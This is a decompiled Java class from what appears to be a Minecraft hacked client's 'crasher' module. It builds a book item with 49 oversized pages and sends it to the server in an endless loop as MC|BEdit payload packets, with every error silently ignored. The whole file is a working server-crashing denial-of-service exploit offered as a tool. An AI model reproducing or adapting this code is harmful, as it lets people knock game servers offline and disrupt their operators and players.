// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.bpc;

import net.minecraft.network.play.client.CPacketCustomPayload;
import net.minecraft.network.PacketBuffer;
import io.netty.buffer.Unpooled;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.client.Minecraft;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Items;

public class BookPayloadCrasher2
{
    public static void start() {
        try {
            final ItemStack bookStack = new ItemStack(Items.WRITABLE_BOOK);
            final NBTTagCompound bookCompound = new NBTTagCompound();
            bookCompound.setString("author", Minecraft.getMinecraft().player.getName());
            bookCompound.setString("title", "3489ry292");
            final NBTTagList pageList = new NBTTagList();
            final String pageText = "gh348f4g3r784hdr89234rhu89yf534789nfgy347f8ynmr78gby3478rdfu9hnf7u89f34fhq07urf3ftg7u89h4ft34587uyftg4593u8i7rfth453rft9345gbhu789rft345ftgh45u89pftgh54ft345hu89ftg45hwft59u4wftgh4";
            for (int page = 0; page < 49; ++page) {
                pageList.appendTag(new NBTTagString("123456123567123781236782356123567235675612346723456789234567893456793456793456792345678934567892345678934567893456789345678934567893456789234567892345678934567893456789345678934567893456789345678934567892345678923456789234567892345678923456789678923453456789234567678934534567893452678923456789345678923456789345678923456789234567892345678923456789234567892345678923456789234567893456789"));
            }
            bookCompound.setTag("pages", pageList);
            bookStack.setTagCompound(bookCompound);
            while (true) {
                final PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
                packetBuffer.writeItemStackToBuffer(bookStack);
                Minecraft.getMinecraft().getConnection().getNetworkManager().channel.writeAndFlush(new CPacketCustomPayload("MC|BEdit", packetBuffer));
                Thread.sleep(175L);
            }
        }
        catch (final Throwable bookStack2) {}
    }
}
